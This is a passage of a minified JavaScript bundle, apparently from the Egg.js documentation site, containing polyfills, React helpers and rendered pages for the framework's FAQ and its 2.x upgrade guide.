e)})),p=!u((function(){d((function(){}))})),h=m||p;a({target:"Reflect",stat:!0,forced:h,sham:h},{construct:function(e,t){l(e),o(t);var n=arguments.length<3?e:l(arguments[2]);if(p&&!m)return d(e,t,n);if(e==n){switch(t.length){case 0:return new e;case 1:return new e(t[0]);case 2:return new e(t[0],t[1]);case 3:return new e(t[0],t[1],t[2]);case 4:return new e(t[0],t[1],t[2],t[3])}var a=[null];return a.push.apply(a,t),new(s.apply(e,a))}var r=n.prototype,u=c(i(r)?r:Object.prototype),h=Function.apply.call(e,u,t);return i(h)?h:u}})},qLmf:function(e,t,n){"use strict";n.d(t,"a",(function(){return o}));var a=n("VGJu"),r=n("zWEY");function l(e){var t=arguments.length>1&&void 0!==arguments[1]&&arguments[1];if(Object(r["a"])(e)){var n=e.nodeName.toLowerCase(),a=["input","select","textarea","button"].includes(n)||e.isContentEditable||"a"===n&&!!e.getAttribute("href"),l=e.getAttribute("tabindex"),o=Number(l),i=null;return l&&!Number.isNaN(o)?i=o:a&&null===i&&(i=0),a&&e.disabled&&(i=null),null!==i&&(i>=0||t&&i<0)}return!1}function o(e){var t=arguments.length>1&&void 0!==arguments[1]&&arguments[1],n=Object(a["a"])(e.querySelectorAll("*")).filter((function(e){return l(e,t)}));return l(e,t)&&n.unshift(e),n}},qPib:function(e,t,n){"use strict";n.d(t,"a",(function(){return r}));var a=n("fnGi");function r(e,t,n){return t=Object(a["a"])(t),t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}},qUkb:function(e,t,n){var a=n("63+Q"),r=n("M+A8");e.exports=Object.keys||function(e){return a(e,r)}},qX4T:function(e,t,n){"use strict";n.d(t,"a",(function(){return l}));var a=n("FU0I"),r=a["createContext"](void 0),l=function(e){var t=e.children,n=e.size;return a["createElement"](r.Consumer,null,(function(e){return a["createElement"](r.Provider,{value:n||e},t)}))};t["b"]=r},qXUs:function(e,t){function n(e,t){(null==t||t>e.length)&&(t=e.length);for(var n=0,a=new Array(t);n<t;n++)a[n]=e[n];return a}e.exports=n,e.exports.__esModule=!0,e.exports["default"]=e.exports},qcID:function(e,t,n){},qkIw:function(e,t,n){var a=n("oyD1"),r=n("a7jj"),l=n("PAgB");e.exports=function(e,t){if(a(e),r(t)&&t.constructor===e)return t;var n=l.f(e),o=n.resolve;return o(t),n.promise}},qxzE:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"If you have questions that is not contained below, please check ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg/issues"},"Egg issues"),"."),r.a.createElement("h2",{id:"how-to-feedback-efficiently"},r.a.createElement(l["AnchorLink"],{to:"#how-to-feedback-efficiently","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"How to feedback efficiently?"),r.a.createElement("p",null,"Thank you for reporting an issue."),r.a.createElement("ol",null,r.a.createElement("li",null,"It's RECOMMENDED to submit PR for typo or tiny bug fix."),r.a.createElement("li",null,"If this's a FEATURE request, please provide: details, pseudo-codes if necessary."),r.a.createElement("li",null,"If this's a BUG, please provide: course repetition, error log and configuration. Fill in as much of the template below as you're able."),r.a.createElement("li",null,r.a.createElement("strong",null,"It will be nice to use ",r.a.createElement("code",null,"npm init egg --type=simple bug")," to provide a mini GitHub repository which can reproduce the issue."))),r.a.createElement("p",null,"Most importantly, please understand one thing: the relationship between the ",r.a.createElement("code",null,"user")," and ",r.a.createElement("code",null,"the maintainer of open source project")," is not ",r.a.createElement("code",null,"Buyer")," and ",r.a.createElement("code",null,"Seller"),', the issue is not a customer order either. When you\'re opening an issue, please hold a mentality of "working together to solve this problem." Do not expect us to serve you unilaterally.'),r.a.createElement("h2",{id:"why-does-my-config-not-work"},r.a.createElement(l["AnchorLink"],{to:"#why-does-my-config-not-work","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Why does my config not work?"),r.a.createElement("p",null,"Framework ",r.a.createElement(l["Link"],{to:"../basics/config"},"Config")," settings is powerfull, support different environments and different places(framework, plugins, app)."),r.a.createElement("p",null,"When you got some trouble, and want to find out what is the final config using at runtime, you can checkout ",r.a.createElement("code",null,"$","{","root","}","/run/application_config.json"),"(workers' configurations) and ",r.a.createElement("code",null,"$","{","root","}","/run/agent_config.json"),"(agent's configurations).(",r.a.createElement("code",null,"root")," is application's root directory, in ",r.a.createElement("code",null,"local")," and ",r.a.createElement("code",null,"unittest")," environments, it will be project base directory, in other environments will be HOME directory)"),r.a.createElement("p",null,"Please make sure you don't make a mistake like the code below:"),r.a.createElement(o["a"],{code:"// config/config.default.js\nexports.someKeys = 'abc';\nmodule.exports = (appInfo) => {\n  const config = {};\n  config.keys = '123456';\n  return config;\n};",lang:"js"}),r.a.createElement("h2",{id:"where-are-my-log-files-in-prod-environment"},r.a.createElement(l["AnchorLink"],{to:"#where-are-my-log-files-in-prod-environment","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Where are my log files in prod environment?"),r.a.createElement("p",null,"By default, logs will print at ",r.a.createElement("code",null,"$","{","baseDir","}","/logs"),"(baseDir is project's base directory) in the local environment. But in non-development environments(neither local nor unittest), the logs will print at ",r.a.createElement("code",null,"$HOME/logs"),"(such as ",r.a.createElement("code",null,"/home/admin/logs"),"). So the logs won't mix in during development and locate in the same place when run in production environment."),r.a.createElement("h2",{id:"why-not-choose-pm2-as-the-process-management-tool"},r.a.createElement(l["AnchorLink"],{to:"#why-not-choose-pm2-as-the-process-management-tool","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Why not choose ",r.a.createElement("code",null,"PM2")," as the process management tool?"),r.a.createElement("ol",null,r.a.createElement("li",null,r.a.createElement("code",null,"PM2")," itself is too complex to issue problems if any."),r.a.createElement("li",null,"Deep optimization could be difficult to achieve if choosing PM2."),r.a.createElement("li",null,"Pattern like one leader process communicating with remote services, along with several follower processes delegating the request to it (",r.a.createElement(l["Link"],{to:"../core/cluster-and-ipc"},"Cluster"),"), is a rigid demand for reducing connections and data exchange load, especially when facing applications in very large scale. egg originates from Ant Financial Group and Alibaba Group, we start with applications in that scale at first, so we take these goals into consideration. All of these goals above could be hard to achieve with PM2.")),r.a.createElement("p",null,"Process management is very important. It defines the way we write code, meanwhile relates to deep runtime optimizations. So we think it's better included in the framework itself."),r.a.createElement("p",null,r.a.createElement("strong",null,"How to start application with PM2?")),r.a.createElement("p",null,"Although PM2 is not recommended, you can use it anyway."),r.a.createElement("p",null,"Firstly, put a start file in the root directory of your project:"),r.a.createElement(o["a"],{code:"// server.js\nconst egg = require('egg');\n\nconst workers = Number(process.argv[2] || require('os').cpus().length);\negg.startCluster({\n  workers,\n  baseDir: __dirname,\n});",lang:"js"}),r.a.createElement("p",null,"We can start the application with PM2 like this:"),r.a.createElement(o["a"],{code:"pm2 start server.js",lang:"bash"}),r.a.createElement("h2",{id:"how-to-resolve-csrf-error"},r.a.createElement(l["AnchorLink"],{to:"#how-to-resolve-csrf-error","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"How to resolve ",r.a.createElement("code",null,"csrf")," error?"),r.a.createElement("p",null,"There are two kinds of common csrf errors:"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"missing csrf token")),r.a.createElement("li",null,r.a.createElement("code",null,"invalid csrf token"))),r.a.createElement("p",null,"By default ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-security/"},"egg-security")," plugin built in Egg requires CSRF validation against all 'unsafe' request such as ",r.a.createElement("code",null,"POST"),", ",r.a.createElement("code",null,"PUT"),", ",r.a.createElement("code",null,"DELETE")," requests."),r.a.createElement("p",null,"The error will disappear in the presence of the correct csrf token in the request. For more implementation details, see [../core/security.md#csrf]."),r.a.createElement("h2",{id:"in-the-local-development-environment-why-is-the-worker-process-not-restarted-automatically-when-files-are-modified"},r.a.createElement(l["AnchorLink"],{to:"#in-the-local-development-environment-why-is-the-worker-process-not-restarted-automatically-when-files-are-modified","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"In the local development Environment, why is the worker process not restarted automatically when files are modified?"),r.a.createElement("p",null,"Usually this happens when you are using Jetbrains softwares(IntelliJ IDEA, WebStorm, etc.) with ",r.a.createElement("code",null,"Safe Write")," turned on."),r.a.createElement("p",null,"According to Jetbrains ",r.a.createElement(l["Link"],{to:"https://www.jetbrains.com/help/webstorm/2016.3/system-settings.html"},"Safe Write document"),":"),r.a.createElement("blockquote",null,r.a.createElement("p",null,"If this check box is selected, a changed file is first saved in a temporary file. If the save operation succeeds, the file being saved is replaced with the saved file. (Technically, the original file is deleted and the temporary file is renamed.)")),r.a.createElement("p",null,"Renaming files leads to file watching failure. The solution is simple: just turn of ",r.a.createElement("code",null,"Safe Write"),' option. (Settings | Appearance & Behavior | System Settings | Use "safe write", the path may vary in different versions)')))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},"r+rm":function(e,t,n){"use strict";var a=n("0mt+"),r=n("m4/z"),l=n("oyD1"),o=n("AOzO"),i=n("NBU9");a({target:"Map",proto:!0,real:!0,forced:r},{keyOf:function(e){return i(o(l(this)),(function(t,n){if(n===e)return i.stop(t)}),void 0,!0,!0).result}})},rDUL:function(e,t,n){var a=n("0mt+"),r=n("oyD1"),l=n("fNvj"),o=n("fd2C"),i=n("lz/I"),c="Seeded Random",s=c+" Generator",u=i.set,d=i.getterFor(s),m='Math.seededPRNG() argument should have a "seed" field with a finite value.',p=o((function(e){u(this,{type:s,seed:e%2147483647})}),c,(function(){var e=d(this),t=e.seed=(1103515245*e.seed+12345)%2147483647;return{value:(1073741823&t)/1073741823,done:!1}}));a({target:"Math",stat:!0,forced:!0},{seededPRNG:function(e){var t=r(e).seed;if(!l(t))throw TypeError(m);return new p(t)}})},rJ1j:function(e,t,n){"use strict";var a=n("0mt+"),r=n("m4/z"),l=n("oyD1"),o=n("G9w8"),i=n("AOzO"),c=n("NBU9");a({target:"Map",proto:!0,real:!0,forced:r},{some:function(e){var t=l(this),n=i(t),a=o(e,arguments.length>1?arguments[1]:void 0,3);return c(n,(function(e,n){if(a(n,e,t))return c.stop()}),void 0,!0,!0).stopped}})},rKDE:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("h2",{id:"background"},r.a.createElement(l["AnchorLink"],{to:"#background","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Background"),r.a.createElement("p",null,"With the official release of Node.js 8 LTS, egg now comes with built-in ES2017 Async Function support."),r.a.createElement("p",null,"Though the TJ ",r.a.createElement(l["Link"],{to:"https://github.com/tj/co"},"co")," has brought ",r.a.createElement("code",null,"async/await")," programming experience before this, but it also has some inevitable problems:"),r.a.createElement("ul",null,r.a.createElement("li",null,"performance lost"),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg/wiki/co-vs-async"},"obscure error logs"))),r.a.createElement("p",null,"In the official Egg 2.x:"),r.a.createElement("ul",null,r.a.createElement("li",null,"Full compatibility to Egg 1.x and ",r.a.createElement("code",null,"generator function"),"."),r.a.createElement("li",null,"Koa 2.x based ",r.a.createElement("code",null,"async function")," solutions."),r.a.createElement("li",null,"Only support Node.js 8 and above."),r.a.createElement("li",null,"Better error stack messages without ",r.a.createElement(l["Link"],{to:"https://github.com/tj/co"},"co"),", approximately 30% performance improvement (do not include the performance improvement brought by Node), see ",r.a.createElement(l["Link"],{to:"https://eggjs.github.io/benchmark/plot/"},"benchmark")," for more details.")),r.a.createElement("p",null,"One of the Egg's concept is ",r.a.createElement("code",null,"progressive"),", hence we provide progressive programming experiences to developers."),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement(l["AnchorLink"],{to:"#quick_upgrade"},"Quick upgrade")),r.a.createElement("li",null,r.a.createElement(l["AnchorLink"],{to:"#plugin"},"Plugin update")),r.a.createElement("li",null,r.a.createElement(l["AnchorLink"],{to:"#forther_upgrade"},"Further upgrade")),r.a.createElement("li",null,r.a.createElement(l["AnchorLink"],{to:"#upgrade_documents_for_plugin_developers"},"Upgrade documents for Plugin developers"))),r.a.createElement("h2",{id:"quick-upgrade"},r.a.createElement(l["AnchorLink"],{to:"#quick-upgrade","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Quick upgrade"),r.a.createElement("ul",null,r.a.createElement("li",null,"Use the latest Node LTS version (",r.a.createElement("code",null,">=8.9.0"),")."),r.a.createElement("li",null,"Change ",r.a.createElement("code",null,"egg")," version to ",r.a.createElement("code",null,"^2.0.0")," in ",r.a.createElement("code",null,"package.json"),"."),r.a.createElement("li",null,"Check if included plugins are the latest version (optional)."),r.a.createElement("li",null,"Reinstall the dependencies, and run unit tests again.")),r.a.createElement("p",null,r.a.createElement("strong",null,"Done! Barely with any code changes")),r.a.createElement("h2",{id:"plugin-update"},r.a.createElement(l["AnchorLink"],{to:"#plugin-update","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Plugin update"),r.a.createElement("h3",{id:"egg-multipart"},r.a.createElement(l["AnchorLink"],{to:"#egg-multipart","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"egg-multipart"),r.a.createElement("p",null,r.a.createElement("code",null,"yield parts")," needs to change to ",r.a.createElement("code",null,"await parts()")," or ",r.a.createElement("code",null,"yield parts()")),r.a.createElement(o["a"],{code:"// old\nconst parts = ctx.multipart();\nwhile ((part = yield parts) != null) {\n  // do something\n}\n\n// yield parts() also work\nwhile ((part = yield parts()) != null) {\n  // do something\n}\n\n// new\nconst parts = ctx.multipart();\nwhile ((part = await parts()) != null) {\n  // do something\n}",lang:"js"}),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-multipart#upload-multiple-files"},"egg-multipart#upload-multiple-files"))),r.a.createElement("h3",{id:"egg-userrole"},r.a.createElement(l["AnchorLink"],{to:"#egg-userrole","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"egg-userrole"),r.a.createElement("p",null,"DO NOT support 1.x role definition, because koa-roles is no longer compatible. The ",r.a.createElement("code",null,"Context")," has changed from ",r.a.createElement("code",null,"this")," to the first argument ",r.a.createElement("code",null,"ctx"),", the original ",r.a.createElement("code",null,"scope")," now is the second argument."),r.a.createElement(o["a"],{code:"// old\napp.role.use('user', function () {\n  return !!this.user;\n});\n\n// new\napp.role.use((ctx, scope) => {\n  return !!ctx.user;\n});\n\napp.role.use('user', (ctx) => {\n  return !!ctx.user;\n});",lang:"js"}),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/koajs/koa-roles/pull/13"},"koajs/koa-roles#13")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-userrole/pull/9"},"eggjs/egg-userrole#9"))),r.a.createElement("h2",{id:"further-upgrade"},r.a.createElement(l["AnchorLink"],{to:"#further-upgrade","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Further upgrade"),r.a.createElement("p",null,"Due to the complete compatibility to Egg 1.x, we can finish the upgrade quickly."),r.a.createElement("p",null,"But in order to keep the coding style consistent, as well as a better performance improvement and more developer-friendly error stack logs, we suggest developers to make a further upgrade:"),r.a.createElement("ul",null,r.a.createElement("li",null,"Use recommended code style, see ",r.a.createElement(l["Link"],{to:"../community/style-guide"},"Style guide")),r.a.createElement("li",null,r.a.createElement(l["AnchorLink"],{to:"#use-koa2-style-middleware"},"Use Koa style middleware")),r.a.createElement("li",null,r.a.createElement(l["AnchorLink"],{to:"#yieldable-to-awaitable"},"Change ",r.a.createElement("code",null,"yieldable")," to ",r.a.createElement("code",null,"awaitable")," in function invoke"))),r.a.createElement("h3",{id:"use-koa2-styled-middleware"},r.a.createElement(l["AnchorLink"],{to:"#use-koa2-styled-middleware","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Use Koa2-styled middleware"),r.a.createElement("blockquote",null,r.a.createElement("p",null,"2.x is compatible to 1.x-styled middleware, so it's still functional without any changes.")),r.a.createElement("ul",null,r.a.createElement("li",null,"Use Koa 2's ",r.a.createElement("code",null,"(ctx, next)")," arguments style in callback function",r.a.createElement("ul",null,r.a.createElement("li",null,"The 1st argument is ",r.a.createElement("code",null,"ctx"),", means context, it is an instance of ",r.a.createElement(l["AnchorLink"],{to:"../basics/extend#Context"},"Context")),r.a.createElement("li",null,"The 2nd argument is ",r.a.createElement("code",null,"next"),", use await to execute it for the coming logics."))),r.a.createElement("li",null,"Using ",r.a.createElement("code",null,"async (ctx, next) => ","{","}")," is not recommended, which prevents anonymous function in error stack."),r.a.createElement("li",null,"Change ",r.a.createElement("code",null,"yield next")," to ",r.a.createElement("code",null,"await next()"),".")),r.a.createElement(o["a"],{code:"// 1.x\nmodule.exports = () => {\n  return function* responseTime(next) {\n    const start = Date.now();\n    yield next;\n    const delta = Math.ceil(Date.now() - start);\n    this.set('X-Response-Time', delta + 'ms');\n  };\n};\n\n// 2.x\nmodule.exports = () => {\n  return async function responseTime(ctx, next) {\n    const start = Date.now();\n    // Note, differ from the generator function middleware, next is a function, we're executing it here\n    await next();\n    const delta = Math.ceil(Date.now() - start);\n    ctx.set('X-Response-Time', delta + 'ms');\n  };\n};",lang:"js"}),r.a.createElement("h3",{id:"yieldable-to-awaitable"},r.a.createElement(l["AnchorLink"],{to:"#yieldable-to-awaitable","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"yieldable to awaitable"),r.a.createElement("blockquote",null,r.a.createElement("p",null,"async was supported in Egg 1.x, thus if the middleware is already async-base, we could skip this section.")),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"https://github.com/tj/co"},"co")," supports ",r.a.createElement("code",null,"yieldable")," compatibility types:"),r.a.createElement("ul",null,r.a.createElement("li",null,"promises"),r.a.createElement("li",null,"array (parallel execution)"),r.a.createElement("li",null,"objects (parallel execution)"),r.a.createElement("li",null,"thunks (functions)"),r.a.createElement("li",null,"generators (delegation)"),r.a.createElement("li",null,"generator functions (delegation)")),r.a.createElement("p",null,"Despite both ",r.a.createElement("code",null,"generator")," and ",r.a.createElement("code",null,"async")," have the same program models, but we may still need to refactor our codes correspondingly after removing ",r.a.createElement("code",null,"co")," because of the above special handling from ",r.a.createElement("code",null,"co"),"."),r.a.createElement("h4",{id:"promise"},r.a.createElement(l["AnchorLink"],{to:"#promise","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"promise"),r.a.createElement("p",null,"We can replace it directly:"),r.a.createElement(o["a"],{code:"function echo(msg) {\n  return Promise.resolve(msg);\n}\n\nyield echo('hi egg');\n// change to\nawait echo('hi egg');",lang:"js"}),r.a.createElement("h4",{id:"array---yield-"},r.a.createElement(l["AnchorLink"],{to:"#array---yield-","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"array - yield []"),r.a.createElement("p",null,r.a.createElement("code",null,"yeild []")," is normally used to send concurrent requests, such as:"),r.a.createElement(o["a"],{code:"const [ news, user ] = yield [\n  ctx.service.news.list(topic),\n  ctx.service.user.get(uid),\n];",lang:"js"}),r.a.createElement("p",null,"In this case, use ",r.a.createElement("code",null,"Promise.all()")," to wrap it:"),r.a.createElement(o["a"],{code:"const [news, user] = await Promise.all([\n  ctx.service.news.list(topic),\n  ctx.service.user.get(uid),\n]);",lang:"js"}),r.a.createElement("h4",{id:"object---yield-"},r.a.createElement(l["AnchorLink"],{to:"#object---yield-","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"object - yield ","{","}"),r.a.createElement("p",null,"Sometimes ",r.a.createElement("code",null,"yield ","{","}")," and ",r.a.createElement("code",null,"yield map")," can also be used to send concurrent requests, but it may be a bit complex in this place because ",r.a.createElement("code",null,"Promise.all")," doesn't support Object argument."),r.a.createElement(o["a"],{code:"// app/service/biz.js\nclass BizService extends Service {\n  * list(topic, uid) {\n    return {\n      news: ctx.service.news.list(topic),\n      user: ctx.service.user.get(uid),\n    };\n  }\n}\n\n// app/controller/home.js\nconst { news, user } = yield ctx.service.biz.list(topic, uid);",lang:"js"}),r.a.createElement("p",null,"It's recommended to use ",r.a.createElement("code",null,"await Promise.all([])"),":"),r.a.createElement(o["a"],{code:"// app/service/biz.js\nclass BizService extends Service {\n  list(topic, uid) {\n    return Promise.all([\n      ctx.service.news.list(topic),\n      ctx.service.user.get(uid),\n    ]);\n  }\n}\n\n// app/controller/home.js\nconst [news, user] = await ctx.service.biz.list(topic, uid);",lang:"js"}),r.a.createElement("p",null,"If the interfaces are unchangeable, e can do things below as a workaround:"),r.a.createElement("ul",null,r.a.createElement("li",null,"Use ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-core/blob/da4ba1784175c43217125f3d5cd7f0be3d5396bf/lib/egg.js#L353"},"app.toPromise")," method provided by our Utils."),r.a.createElement("li",null,r.a.createElement("strong",null,"This is built on top of the ",r.a.createElement(l["Link"],{to:"https://github.com/tj/co"},"co"),", so it may still cause performance issue and returning inaccurate error stacks, so this is not recommended."))),r.a.createElement(o["a"],{code:"const { news, user } = await app.toPromise(ctx.service.biz.list(topic, uid));",lang:"js"}),r.a.createElement("h4",{id:"others"},r.a.createElement(l["AnchorLink"],{to:"#others","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Others"),r.a.createElement("ul",null,r.a.createElement("li",null,"thunks (functions)"),r.a.createElement("li",null,"generators (delegation)"),r.a.createElement("li",null,"generator functions (delegation)")),r.a.createElement("p",null,"Use ",r.a.createElement("code",null,"async function")," to replace the above functions, or use ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-core/blob/da4ba1784175c43217125f3d5cd7f0be3d5396bf/lib/egg.js#L344"},"app.toAsyncFunction")," alternatively."),r.a.createElement("p",null,r.a.createElement("strong",null,"Note")),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-core/blob/da4ba1784175c43217125f3d5cd7f0be3d5396bf/lib/egg.js#L344"},"toAsyncFunction")," and ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-core/blob/da4ba1784175c43217125f3d5cd7f0be3d5396bf/lib/egg.js#L353"},"toPromise")," are wrappers of ",r.a.createElement(l["Link"],{to:"https://github.com/tj/co"},"co"),", thus it may cause performance lost and error stack problems. So we're recommending developers to use all-chain upgrade."),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-core/blob/da4ba1784175c43217125f3d5cd7f0be3d5396bf/lib/egg.js#L344"},"toAsyncFunction")," doesn't have performance lost when invokes async function.")),r.a.createElement("p",null,"@sindresorhus has written a lot ",r.a.createElement(l["Link"],{to:"https://github.com/sindresorhus/promise-fun"},"promise-based helpers"),", use them together with async function could make source code more readable."),r.a.createElement("h2",{id:"plugin-update-1"},r.a.createElement(l["AnchorLink"],{to:"#plugin-update-1","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Plugin update"),r.a.createElement("p",null,r.a.createElement("code",null,"App developers")," just need to update the upgraded plugins by ",r.a.createElement("code",null,"plugin developers"),", or use ",r.a.createElement("code",null,"egg-bin autod")," command we've prepared to quickly update."),r.a.createElement("p",null,"The following content is for ",r.a.createElement("code",null,"plugin developers"),", it shows how to update the plugins:"),r.a.createElement("h3",{id:"update-precautions"},r.a.createElement(l["AnchorLink"],{to:"#update-precautions","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Update precautions"),r.a.createElement("ul",null,r.a.createElement("li",null,"Finish the upgrade items above.",r.a.createElement("ul",null,r.a.createElement("li",null,"Replace all ",r.a.createElement("code",null,"generator function")," with ",r.a.createElement("code",null,"async function"),"."),r.a.createElement("li",null,"Upgrade middlewares."))),r.a.createElement("li",null,"Interfaces compatibility (optional), see following."),r.a.createElement("li",null,"Release a major version.")),r.a.createElement("h3",{id:"interfaces-compatibility"},r.a.createElement(l["AnchorLink"],{to:"#interfaces-compatibility","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Interfaces compatibility"),r.a.createElement("p",null,"In some cases, the interface provided by ",r.a.createElement("code",null,"Plugin developers")," supports both generator and async, normally it's wrapped by co."),r.a.createElement("ul",null,r.a.createElement("li",null,"In 2.x, we suggest ",r.a.createElement("code",null,"async-first")," to get a better performance and clearer error stacks."),r.a.createElement("li",null,"If necessary, please use ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-core/blob/da4ba1784175c43217125f3d5cd7f0be3d5396bf/lib/egg.js#L344"},"toAsyncFunction")," and ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-core/blob/da4ba1784175c43217125f3d5cd7f0be3d5396bf/lib/egg.js#L353"},"toPromise")," for compatibility.")),r.a.createElement("p",null,"Like ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-schedule"},"egg-schedule")," plugin, it supports generator or async to define the tasks in application level."),r.a.createElement(o["a"],{code:"// {app_root}/app/schedule/cleandb.js\nexports.task = function* (ctx) {\n  yield ctx.service.db.clean();\n};\n\n// {app_root}/app/schedule/log.js\nexports.task = async function splitLog(ctx) {\n  await ctx.service.log.split();\n};",lang:"js"}),r.a.createElement("p",null,r.a.createElement("code",null,"Plugin developers")," could simply wrap the following raw function:"),r.a.createElement(o["a"],{code:"// https://github.com/eggjs/egg-schedule/blob/80252ef/lib/load_schedule.js#L38\ntask = app.toAsyncFunction(schedule.task);",lang:"js"}),r.a.createElement("h3",{id:"rules-of-plugin-release"},r.a.createElement(l["AnchorLink"],{to:"#rules-of-plugin-release","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Rules of Plugin release"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("strong",null,"Major version releasement"),r.a.createElement("ul",null,r.a.createElement("li",null,"All the APIs are promise based, and there's no ",r.a.createElement("code",null,"async")," in source code. e.g. ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-view-nunjucks"},"egg-view-nunjucks")))),r.a.createElement("li",null,"Modify ",r.a.createElement("code",null,"package.json"),r.a.createElement("ul",null,r.a.createElement("li",null,"Change ",r.a.createElement("code",null,"egg")," in ",r.a.createElement("code",null,"devDependencies")," to ",r.a.createElement("code",null,"^2.0.0"),"."),r.a.createElement("li",null,"Change ",r.a.createElement("code",null,"engines.node")," to ",r.a.createElement("code",null,">=8.0.0"),"."),r.a.createElement("li",null,"Change ",r.a.createElement("code",null,"ci.version")," to ",r.a.createElement("code",null,"8, 9"),", reinstall dependencies to generate new travis config files."))),r.a.createElement("li",null,"Update examples in ",r.a.createElement("code",null,"README.md")," with async function."),r.a.createElement("li",null,"Write instructions for upgrade."),r.a.createElement("li",null,"(optional) Change ",r.a.createElement("code",null,"test/fixtures")," to async function, and it's recommended to create a PR for code preview.")),r.a.createElement("p",null,"In case the previous versions still requires maintenance:"),r.a.createElement("ul",null,r.a.createElement("li",null,"Create a new branch which based on previous ",r.a.createElement("code",null,"1.x")," version."),r.a.createElement("li",null,"Change the ",r.a.createElement("code",null,"publishConfig.tag")," property in ",r.a.createElement("code",null,"package.json")," to ",r.a.createElement("code",null,"release-1.x")," in previous version."),r.a.createElement("li",null,"If the previous version has new Bugfix, tag it as ",r.a.createElement("code",null,"release-1.x")," when publishing, so users may use ",r.a.createElement("code",null,"npm i egg-xx@release-1")," to import the old version."),r.a.createElement("li",null,"See ",r.a.createElement(l["Link"],{to:"https://docs.npmjs.com/cli/dist-tag"},"npm documentations"),"."))))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},rSPa:function(e,t,n){"use strict";var a=n("Kdrj").charAt;e.exports=function(e,t,n){return t+(n?a(e,t).length:1)}},rUla:function(e,t,n){"use strict";var a,r,l,o,i;if("undefined"===typeof window||"function"!==typeof MessageChannel){var c=null,s=null,u=function e(){if(null!==c)try{var n=t.unstable_now();c(!0,n),c=null}catch(a){throw setTimeout(e,0),a}},d=Date.now();t.unstable_now=function(){return Date.now()-d},a=function(e){null!==c?setTimeout(a,0,e):(c=e,setTimeout(u,0))},r=function(e,t){s=setTimeout(e,t)},l=function(){clearTimeout(s)},o=function(){return!1},i=t.unstable_forceFrameRate=function(){}}else{var m=window.performance,p=window.Date,h=window.setTimeout,g=window.clearTimeout;if("undefined"!==typeof console){var f=window.cancelAnimationFrame;"function"!==typeof window.requestAnimationFrame&&console.error("This browser doesn't support requestAnimationFrame. Make sure that you load a polyfill in older browsers. https://fb.me/react-polyfills"),"function"!==typeof f&&console.error("This browser doesn't support cancelAnimationFrame. Make sure that you load a polyfill in older browsers. 